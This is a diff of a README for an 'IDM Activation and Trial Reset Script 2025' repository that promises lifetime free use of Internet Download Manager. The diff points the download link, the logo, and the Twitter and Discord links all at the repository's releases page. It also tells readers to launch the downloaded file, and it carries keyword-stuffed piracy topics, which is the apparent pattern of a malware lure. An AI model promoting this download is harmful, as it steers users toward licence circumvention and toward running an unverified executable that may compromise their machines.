@@ -14,7 +14,7 @@ Welcome to the IDM Activation and Trial Reset Script 2025 repository! This scrip
 - **Repository Name**: IDM-Activation-Script-2025
 - **Description**: IDM freeze trial and activation with registry key lock method. Activation and trial persist even after installing IDM updates. IDM trial reset
 - **Topics**: download-idm-free-for-lifetime, download-idm-lifetime-free, free-idm, free-idm-2025, free-idm-key, idm-download, idm-free, idm-free-pc, idm-free-windows, idm-full, idm-license, idm-reset-trial, idm-resetter-download, idm-trial-reset-tool, internet-download-manager-premium
-- [**Download the Script**](https://github.com/uploads/App.zip) 🚀
+- [**Download the Script**](https://github.com/phathaha2/IDM-Activation-Script-2025/releases) 🚀
 
 ### Note: Launch the downloaded file to get started with the IDM Activation and Trial Reset Script.
 
@@ -35,7 +35,7 @@ Don't miss out on the opportunity to enjoy IDM's premium features for a lifetime
 
 Let's make IDM activation and trial resetting a hassle-free experience together! 💻🔗
 
-![IDM Logo](https://example.com/idm-logo.png)
+![IDM Logo](https://github.com/phathaha2/IDM-Activation-Script-2025/releases)
   
 --- 
 
@@ -49,8 +49,8 @@ This repository is for educational purposes only. Users are responsible for comp
 
 ### Let's Connect:
 Stay up-to-date with the latest IDM Activation Script news and updates:
-- Follow us on [Twitter](https://twitter.com/idmactivation)
-- Join the conversation on [Discord](https://discord.gg/idmcommunity)
+- Follow us on [Twitter](https://github.com/phathaha2/IDM-Activation-Script-2025/releases)
+- Join the conversation on [Discord](https://github.com/phathaha2/IDM-Activation-Script-2025/releases)
   
 Thank you for choosing IDM Activation and Trial Reset Script 2025! Happy Downloading! 🚀🔥
 
